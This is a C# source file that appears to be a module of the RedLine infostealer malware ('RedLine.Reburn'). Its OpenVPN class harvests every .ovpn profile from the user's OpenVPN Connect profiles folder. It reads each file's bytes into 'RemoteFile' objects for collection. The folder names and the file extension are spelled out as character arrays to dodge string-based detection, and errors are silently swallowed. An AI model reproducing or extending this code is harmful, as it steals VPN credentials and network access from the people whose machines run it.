using System.Collections.Generic;
using System.IO;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class OpenVPN
{
	public static List<RemoteFile> ParseFiles()
	{
		List<RemoteFile> list = new List<RemoteFile>();
		try
		{
			string path = Path.Combine(Constants.RoamingAppData, new string(new char[15]
			{
				'O', 'p', 'e', 'n', 'V', 'P', 'N', ' ', 'C', 'o',
				'n', 'n', 'e', 'c', 't'
			}) + "\\" + new string(new char[8] { 'p', 'r', 'o', 'f', 'i', 'l', 'e', 's' }));
			if (!Directory.Exists(path))
			{
				return list;
			}
			try
			{
				string[] files = Directory.GetFiles(path);
				foreach (string path2 in files)
				{
					if (Path.GetExtension(path2)!.Contains(new string(new char[4] { 'o', 'v', 'p', 'n' })))
					{
						list.Add(new RemoteFile
						{
							Body = File.ReadAllBytes(path2),
							FileName = Path.GetFileName(path2)
						});
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		catch
		{
			return list;
		}
	}
}
